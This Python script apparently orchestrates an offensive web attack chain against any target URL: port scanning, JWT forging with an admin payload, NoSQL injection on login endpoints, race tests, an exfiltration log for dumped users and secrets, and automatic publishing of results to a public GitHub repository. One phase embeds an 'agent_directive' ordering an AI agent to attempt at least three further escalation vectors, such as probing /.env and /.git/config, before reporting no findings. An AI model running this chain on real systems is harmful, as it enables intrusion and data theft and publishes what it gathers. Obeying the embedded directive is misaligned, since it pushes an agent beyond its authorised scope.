#!/usr/bin/env python3
"""
Schatten Run — orchestrator for full Schatten Brutal audit chain.
Runs: recon → browser harvest → JWT forge → NoSQLi → race test → cleanup.

Usage:
    python3 schatten-run.py <target_url> [options]

Options:
    --name NAME          Audit name (default: derived from target)
    --output DIR         Output directory (default: .schatten-reports/<name>)
    --phase PHASE        Run specific phase: recon|browser|jwt|nosql|race|exfil|cleanup|all
    --auth-header HEAD   Auth header 'Authorization: Bearer ***' (for auth phases)
    --supabase-url URL   Supabase URL for DB layer
    --service-key KEY    Supabase service key
    --login-url URL      Login URL for browser auth
    --login-user USER    Login user/email
    --login-pass PASS    Login password
    --skip-cleanup       Don't auto-cleanup test artifacts
    --brute-wordlist F   Wordlist for JWT HS256 brute
    --concurrent N       Concurrent requests for race tests
    --cookie-jar F       File to store/load cookies
"""

import sys
import json
import time
import argparse
import subprocess
import shutil
from pathlib import Path
from datetime import datetime, timezone
from urllib.parse import urlparse

try:
    import requests
except ImportError:
    print("pip install requests"); sys.exit(1)


TOOLS_DIR = Path(__file__).parent


def banner():
    print("""
╔═══════════════════════════════════════════════════════════╗
║          SCHATTEN RUN — Orchestrator v1.0                ║
║     Full audit chain: recon → exploit → cleanup          ║
╚═══════════════════════════════════════════════════════════╝
""")


def log(msg, level="[*]"):
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S UTC")
    print(f"[{ts}] {level} {msg}")


def run_tool(cmd: list[str], cwd: Path = None, timeout: int = 600) -> dict:
    """Run external tool and capture output."""
    log(f"exec: {' '.join(cmd[:3])}...")
    try:
        result = subprocess.run(
            cmd,
            cwd=cwd or TOOLS_DIR,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return {
            "cmd": cmd,
            "returncode": result.returncode,
            "stdout": result.stdout,
            "stderr": result.stderr,
        }
    except subprocess.TimeoutExpired:
        return {"cmd": cmd, "returncode": -1, "error": "TIMEOUT"}
    except Exception as e:
        return {"cmd": cmd, "returncode": -1, "error": str(e)}


def phase_passive_recon(target: str, output_dir: Path) -> dict:
    """Phase 1: Passive reconnaissance."""
    log("PHASE 1: Passive Reconnaissance")
    parsed = urlparse(target)
    host = parsed.hostname or target

    results = {"target": target, "host": host, "ports": {}, "headers": {}}

    # DNS resolution
    try:
        import socket
        ip = socket.gethostbyname(host)
        results["ip"] = ip
        log(f"  resolved {host} → {ip}")
    except Exception as e:
        log(f"  DNS failed: {e}", "[-]")
        return results

    # HTTP headers
    try:
        r = requests.get(target, timeout=10, allow_redirects=False, verify=False)
        results["headers"] = dict(r.headers)
        results["status"] = r.status_code
        log(f"  GET {target} → {r.status_code}")
        for k in ["Server", "X-Powered-By", "Set-Cookie", "Content-Security-Policy", "Strict-Transport-Security"]:
            if k in r.headers:
                log(f"    {k}: {r.headers[k][:80]}")
    except Exception as e:
        log(f"  HTTP failed: {e}", "[-]")

    # Quick port scan via socket (limited — nmap preferred)
    common_ports = [21, 22, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9090, 27017]
    open_ports = []
    for port in common_ports:
        try:
            import socket as _s
            s = _s.socket(_s.AF_INET, _s.SOCK_STREAM)
            s.settimeout(1.5)
            if s.connect_ex((ip, port)) == 0:
                open_ports.append(port)
                log(f"  port {port}: OPEN", "[!]")
            s.close()
        except Exception:
            pass
    results["open_ports"] = open_ports

    # Save
    (output_dir / "01_passive_recon.json").write_text(json.dumps(results, indent=2, default=str))
    log(f"  saved → {output_dir / '01_passive_recon.json'}")
    return results


def phase_browser_harvest(target: str, output_dir: Path, args) -> dict:
    """Phase 2: Browser-based attacks via Playwright."""
    log("PHASE 2: Browser Harvest (Playwright)")
    cmd = [sys.executable, str(TOOLS_DIR / "browser-harvest.py"), target,
           "--output", str(output_dir / "02_browser")]
    if args.login_url and args.login_user and args.login_pass:
        cmd.extend(["--login-url", args.login_url, "--login-user", args.login_user, "--login-pass", args.login_pass])

    result = run_tool(cmd, timeout=180)
    log(f"  browser-harvest exit={result.get('returncode')}")
    return result


def phase_jwt_forge(target: str, output_dir: Path, args) -> dict:
    """Phase 3: JWT forging attacks."""
    log("PHASE 3: JWT Forge")
    # Try common endpoints
    endpoints_to_try = [
        f"{target}/rest/user/whoami",
        f"{target}/api/auth/me",
        f"{target}/api/user/profile",
        f"{target}/rest/products/search?q=test",
    ]

    results = {}
    for ep in endpoints_to_try:
        log(f"  testing {ep}")
        cmd = [sys.executable, str(TOOLS_DIR / "jwt-forge.py"), ep,
               "--payload", '{"email":"admin@target.local","role":"admin","iat":9999999999}',
               "--kid-inject", "--all",
               "--output", str(output_dir / "03_jwt_forge.json")]
        if args.auth_header:
            cmd.extend(["--auth-header", args.auth_header.split(":")[0].strip()])
        if args.brute_wordlist:
            cmd.extend(["--secret-list", args.brute_wordlist])

        result = run_tool(cmd, timeout=300)
        results[ep] = result
        if result.get("returncode") == 0:
            log(f"  jwt-forge: no hits on {ep}", "[-]")
        else:
            log(f"  jwt-forge: HITS detected on {ep}", "[!]")

    return results


def phase_nosql(target: str, output_dir: Path, args) -> dict:
    """Phase 4: NoSQL injection."""
    log("PHASE 4: NoSQL Injection (NoQLi)")
    endpoints = [
        (f"{target}/rest/user/login", "POST", {"email": "admin@juice-sh.op", "password": "***"}),
        (f"{target}/api/Users", "POST", {"email": "test@test.com", "password": "***"}),
        (f"{target}/api/auth/login", "POST", {"username": "admin", "password": "***"}),
        (f"{target}/rest/products/search", "GET", {"q": "test"}),
    ]

    results = {}
    for url, method, data in endpoints:
        log(f"  testing {method} {url}")
        cmd = [sys.executable, str(TOOLS_DIR / "noqli.py"), url,
               "--method", method,
               "--output", str(output_dir / f"04_nosql_{hash(url) & 0xFFFF}.json")]
        if args.auth_header:
            cmd.extend(["--auth", args.auth_header])

        result = run_tool(cmd, timeout=300)
        results[url] = result
        if result.get("returncode") != 0:
            log(f"  NoQLi: HITS on {url}", "[!]")
        else:
            log(f"  NoQLi: clean on {url}", "[-]")

    return results


def phase_race(target: str, output_dir: Path, args) -> dict:
    """Phase 5: Race condition testing."""
    log("PHASE 5: Race Conditions")
    cmd = [sys.executable, str(TOOLS_DIR / "race-test.py"), target,
           "--concurrent", str(args.concurrent),
           "--test", "all",
           "--output", str(output_dir / "05_race.json")]
    if args.auth_header:
        cmd.extend(["--auth", args.auth_header])

    result = run_tool(cmd, timeout=300)
    log(f"  race-test exit={result.get('returncode')}")
    return result


def phase_creative_escalation(target: str, output_dir: Path, name: str) -> dict:
    """Phase 8: Creative escalation when all tools are clean.
    
    This is a DOCUMENTATION phase — it tells the agent what to try.
    The agent must execute these manually since they require human creativity.
    """
    log("PHASE 8: Creative Escalation (tools clean → push harder)")
    
    escalation = {
        "target": target,
        "phase": "creative_escalation",
        "triggered": True,
        "instructions": [
            "1. Chain existing partial findings",
            "2. Business logic abuse (price manipulation, workflow bypass)",
            "3. Supply chain + dependency analysis",
            "4. GraphQL / hidden API discovery",
            "5. Subdomain + DNS attack",
            "6. Social engineering surface",
            "7. Shodan/Censys scan",
            "8. Advanced crypto (alg confusion, padding oracle)",
        ],
        "commands_to_run": [
            f"# GraphQL introspection",
            f"curl -sS -X POST {target}/graphql -H 'Content-Type: application/json' -d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}'",
            f"",
            f"# Hidden endpoints",
            f"for p in /graphql /api/v2 /internal /_internal /debug /admin /.git/config /.env /package.json /requirements.txt /server.js /app.js; do curl -sS -o /dev/null -w \"$p → %{{http_code}}\n\" {target}$p; done",
            f"",
            f"# Subdomain takeover check",
            f"for sub in mail ftp api admin dev staging test staging-api; do dig +short $sub.{urlparse(target).hostname} 2>/dev/null && echo \"$sub: resolved\"; done",
            f"",
            f"# Shodan lookup",
            f"curl -sS \"https://www.shodan.io/host/{urlparse(target).hostname}\" 2>/dev/null | head -50",
            f"",
            f"# GitHub dork",
            f"# Search: site:github.com \"{urlparse(target).hostname}\" password OR secret OR api_key",
        ],
        "agent_directive": (
            "Agent: This phase is NOT optional. If all prior tools came back clean, "
            "you MUST attempt at least 3 of these escalation vectors. "
            "Document each attempt (tried + result) in 08_creative_escalation.md. "
            "Do NOT report 'no findings' until you've exhausted this list."
        ),
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    
    out = output_dir / "08_creative_escalation.json"
    out.write_text(json.dumps(escalation, indent=2))
    log(f"  escalation guide → {out}")
    
    # Also write markdown version
    md = output_dir / "08_creative_escalation.md"
    md_content = f"""# Creative Escalation — {name}
**Target:** {target}
**Trigger:** All automated tools returned clean.
**Status:** ⏳ AWAITING MANUAL ESCALATION

## Escalation Checklist

- [ ] Chain partial findings
- [ ] Business logic abuse
- [ ] Supply chain / dependency analysis
- [ ] GraphQL introspection
- [ ] Hidden API endpoints
- [ ] Subdomain takeover check
- [ ] Shodan/Censys scan
- [ ] GitHub dork
- [ ] Advanced crypto attacks
- [ ] Social engineering surface

## Attempts

*Document each attempt here with PoC evidence.*
"""
    md.write_text(md_content)
    log(f"  escalation checklist → {md}")
    return escalation


def push_to_github(output_dir: Path, name: str, target: str, auth_header: str = None) -> dict:
    """Push audit results to GitHub per-target repo.
    Auto-detect: if output_dir is not a git repo, snapshot to /tmp and push from there.
    """
    log("PHASE 9: Push to GitHub")
    
    repo_name = f"{name}-audit"
    results = {"repo": repo_name, "pushed": False}
    
    # Check if gh is available
    gh_check = run_tool(["gh", "auth", "status"], timeout=10)
    if gh_check.get("returncode") != 0:
        log("  gh not authenticated — skipping push", "[-]")
        results["error"] = "gh not authenticated"
        return results
    
    # Determine git working dir: use /tmp snapshot if output_dir isn't a standalone repo
    git_dir = output_dir
    if not (output_dir / ".git").exists():
        import tempfile
        snap = Path(tempfile.gettempdir()) / repo_name
        if snap.exists():
            shutil.rmtree(snap)
        shutil.copytree(output_dir, snap)
        git_dir = snap
        log(f"  output not a git repo → snapshot to {git_dir}")
    
    # Check if repo exists
    repo_check = run_tool(["gh", "repo", "view", repo_name, "--json", "name"], timeout=10)
    
    if repo_check.get("returncode") != 0:
        # Create repo
        log(f"  creating repo: {repo_name}")
        create_result = run_tool(["gh", "repo", "create", repo_name, "--public", "--source=.", "--push"], timeout=30, cwd=git_dir)
        if create_result.get("returncode") != 0:
            run_tool(["gh", "repo", "create", repo_name, "--public"], timeout=30)
    
    # Init git if needed
    if not (git_dir / ".git").exists():
        run_tool(["git", "init"], cwd=git_dir)
        run_tool(["git", "config", "user.email", "abdullahalmughiroh@gmail.com"], cwd=git_dir)
        run_tool(["git", "config", "user.name", "Exilio"], cwd=git_dir)
        run_tool(["git", "remote", "add", "origin", f"https://github.com/Cael1107/{repo_name}.git"], cwd=git_dir)
    
    # Add and commit
    run_tool(["git", "add", "-A"], cwd=git_dir)
    commit_msg = f"schatten-brutal: {name} audit {datetime.now(timezone.utc).strftime('%Y-%m-%d')}"
    run_tool(["git", "commit", "-m", commit_msg], cwd=git_dir)
    
    # Push (use --force to overwrite, branch main)
    run_tool(["git", "branch", "-M", "main"], cwd=git_dir)
    push_result = run_tool(["git", "push", "-u", "origin", "main", "--force"], timeout=60, cwd=git_dir)
    results["pushed"] = push_result.get("returncode") == 0
    results["commit"] = commit_msg
    
    if results["pushed"]:
        log(f"  pushed to github.com/Cael1107/{repo_name}")
    else:
        log(f"  push failed: {push_result.get('stderr', '')[:120]}", "[-]")
    
    return results


def phase_cleanup(target: str, output_dir: Path, args) -> dict:
    """Phase 6: Cleanup test artifacts."""
    log("PHASE 6: Post-Audit Cleanup")
    results = {"actions": []}

    if args.skip_cleanup:
        log("  cleanup SKIPPED (--skip-cleanup)", "[!]")
        return results

    # 1. Try to delete test user via management API
    if args.supabase_url and args.service_key:
        for pattern in ["schatten_", "race_test_", "admin_bypass", "pentest_"]:
            try:
                r = requests.get(
                    f"{args.supabase_url}/auth/v1/admin/users",
                    headers={"apikey": args.service_key, "Authorization": f"Bearer {args.service_key}"},
                    params={"per_page": 1000},
                    timeout=15,
                )
                if r.status_code == 200:
                    users = r.json().get("users", [])
                    for u in users:
                        if pattern in u.get("email", ""):
                            del_r = requests.delete(
                                f"{args.supabase_url}/auth/v1/admin/users/{u['id']}",
                                headers={"apikey": args.service_key, "Authorization": f"Bearer {args.service_key}"},
                                timeout=10,
                            )
                            results["actions"].append({"action": "delete_user", "email": u["email"], "status": del_r.status_code})
                            log(f"  deleted test user: {u['email']} (status={del_r.status_code})")
            except Exception as e:
                results["actions"].append({"action": "delete_user", "pattern": pattern, "error": str(e)})

    # 2. Document everything that needs manual cleanup
    cleanup_doc = {
        "manual_cleanup_required": [
            "Check app DB for test users (search: schatten, race_test, admin_bypass, pentest)",
            "Check app DB for test orders (race test invoices)",
            "Restore any config values you overwrote during exploit",
            "Remove any uploaded webshells or malicious files",
            "Revoke any test JWTs that were distributed",
        ],
        "auto_cleaned": results["actions"],
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    (output_dir / "06_cleanup.json").write_text(json.dumps(cleanup_doc, indent=2))
    log(f"  cleanup record → {output_dir / '06_cleanup.json'}")
    return results


def phase_exfil(target: str, output_dir: Path) -> dict:
    """Phase 7: Document exfiltrated data (manual entries expected)."""
    log("PHASE 7: Data Exfiltration Record")
    template = {
        "users_dumped": [],
        "orders_dumped": [],
        "config_dumped": [],
        "secrets_dumped": [],
        "instructions": "Edit this file to record what was exfiltrated. Empty arrays = none.",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    out = output_dir / "07_exfil_record.json"
    out.write_text(json.dumps(template, indent=2))
    log(f"  template → {out}")
    log("  >>> EDIT THIS FILE with actual findings <<<", "[!]")
    return template


def generate_final_report(target: str, output_dir: Path, name: str, all_results: dict) -> Path:
    """Generate consolidated final report."""
    log("Generating final report...")
    md = output_dir / f"{name}-schatten-brutal-report.md"

    # Determine if all tools were clean (triggers creative escalation)
    tool_phases = ["recon", "browser_harvest", "jwt_forge", "nosql", "race"]
    tools_clean = all(
        all_results.get(phase) is not None
        for phase in tool_phases
    )

    content = f"""# Schatten Brutal Report — {name}
**Target:** {target}
**Date:** {datetime.now(timezone.utc).isoformat()}
**Toolchain:** schatten-run.py orchestrator

---

## Executive Summary

Automated full-chain audit using custom toolchain.

## Phases Executed

| Phase | Status | Output |
|-------|--------|--------|
| 1. Passive Recon | ✅ | 01_passive_recon.json |
| 2. Browser Harvest | {'✅' if 'browser_harvest' in all_results else '⏭️'} | 02_browser/ |
| 3. JWT Forge | {'✅' if 'jwt_forge' in all_results else '⏭️'} | 03_jwt_forge.json |
| 4. NoSQLi | {'✅' if 'nosql' in all_results else '⏭️'} | 04_nosql_*.json |
| 5. Race Test | {'✅' if 'race' in all_results else '⏭️'} | 05_race.json |
| 6. Cleanup | {'✅' if 'cleanup' in all_results else '⏭️'} | 06_cleanup.json |
| 7. Exfil Record | ✅ | 07_exfil_record.json |
| 8. Creative Escalation | {'🚨 TRIGGERED' if all_results.get('escalate', {}).get('triggered') else '⏭️'} | 08_creative_escalation.md |
| 9. GitHub Push | {'✅' if all_results.get('github', {}).get('pushed') else '⏭️'} | github.com/Cael1107/{name}-audit |

## Findings

See individual phase outputs. Edit 07_exfil_record.json with manual findings.

## Cleanup Status

{'✅ Auto-cleanup executed' if all_results.get('cleanup', {}).get('actions') else '⚠️ Manual cleanup required'}

## Creative Escalation

{'🚨 All automated tools came back clean. See 08_creative_escalation.md for manual escalation checklist.' if all_results.get('escalate', {}).get('triggered') else 'Tools found direct vulns — creative escalation not required.'}
"""

    md.write_text(content)
    log(f"  → {md}")
    return md


def main():
    banner()

    parser = argparse.ArgumentParser(description="Schatten Run — orchestrator")
    parser.add_argument("target", help="Target URL")
    parser.add_argument("--name", help="Audit name")
    parser.add_argument("--output", help="Output directory")
    parser.add_argument("--phase", default="all",
                        choices=["recon", "browser", "jwt", "nosql", "race", "cleanup", "exfil", "escalate", "github", "all"])
    parser.add_argument("--auth-header", help="'Authorization: Bearer ***'")
    parser.add_argument("--supabase-url", help="Supabase URL for cleanup")
    parser.add_argument("--service-key", help="Supabase service key")
    parser.add_argument("--login-url", help="Login URL")
    parser.add_argument("--login-user", help="Login user")
    parser.add_argument("--login-pass", help="Login pass")
    parser.add_argument("--skip-cleanup", action="store_true", help="Skip cleanup phase")
    parser.add_argument("--brute-wordlist", help="Wordlist for JWT HS256 brute")
    parser.add_argument("--concurrent", type=int, default=10, help="Concurrent race requests")
    parser.add_argument("--phase-timeout", type=int, default=300, help="Max seconds per phase")
    args = parser.parse_args()

    # Setup
    parsed = urlparse(args.target)
    name = args.name or (parsed.hostname.replace(".", "_") if parsed.hostname else "audit")
    output_dir = Path(args.output or f".schatten-reports/{name}")
    output_dir.mkdir(parents=True, exist_ok=True)

    # Incremental progress file (survives hang/kill)
    progress = {"target": args.target, "name": name, "phases_done": [], "start": datetime.now(timezone.utc).isoformat()}
    def save_progress():
        (output_dir / "_progress.json").write_text(json.dumps(progress, indent=2, default=str))
    save_progress()

    log(f"Target: {args.target}")
    log(f"Output: {output_dir}")
    log(f"Phases: {args.phase}")

    all_results = {}
    start = time.time()

    phases_to_run = ["recon", "browser", "jwt", "nosql", "race", "exfil", "cleanup", "escalate", "github"] if args.phase == "all" else [args.phase]
    PHASE_MAP = {
        "recon": ("recon", "phase_passive_recon", (args.target, output_dir)),
        "browser": ("browser_harvest", "phase_browser_harvest", (args.target, output_dir, args)),
        "jwt": ("jwt_forge", "phase_jwt_forge", (args.target, output_dir, args)),
        "nosql": ("nosql", "phase_nosql", (args.target, output_dir, args)),
        "race": ("race", "phase_race", (args.target, output_dir, args)),
        "exfil": ("exfil", "phase_exfil", (args.target, output_dir)),
        "cleanup": ("cleanup", "phase_cleanup", (args.target, output_dir, args)),
        "escalate": ("escalate", "phase_creative_escalation", (args.target, output_dir, name)),
        "github": ("github", "push_to_github", (output_dir, name, args.target, args.auth_header)),
    }

    import inspect
    import threading
    def _run_phase(fn, fn_args, timeout):
        """Run phase in thread; return (result, timed_out)."""
        box = {}
        def _t():
            try:
                box["r"] = fn(*fn_args)
            except Exception as e:
                box["err"] = str(e)
        th = threading.Thread(target=_t, daemon=True)
        th.start()
        th.join(timeout)
        if th.is_alive():
            return {"error": f"PHASE TIMEOUT after {timeout}s"}, True
        if "err" in box:
            return {"error": box["err"]}, False
        return box.get("r"), False

    for ph in phases_to_run:
        key, fn_name, fn_args = PHASE_MAP[ph]
        fn = globals()[fn_name] if fn_name in globals() else None
        if fn is None:
            log(f"  phase '{ph}' not implemented", "[-]")
            continue
        log(f"→ running phase: {ph} (timeout={args.phase_timeout}s)")
        try:
            res, timed_out = _run_phase(fn, fn_args, args.phase_timeout)
            all_results[key] = res
            if timed_out:
                log(f"  ✗ {ph} TIMED OUT", "[!]")
                progress.setdefault("phases_failed", []).append(f"{ph}:timeout")
            else:
                progress["phases_done"].append(ph)
            save_progress()
            log(f"  ✓ {ph} done" if not timed_out else f"  ✗ {ph} timeout")
        except Exception as e:
            log(f"  ✗ {ph} failed: {e}", "[!]")
            all_results[key] = {"error": str(e)}
            progress.setdefault("phases_failed", []).append(ph)
            save_progress()


if __name__ == "__main__":
    sys.exit(main())
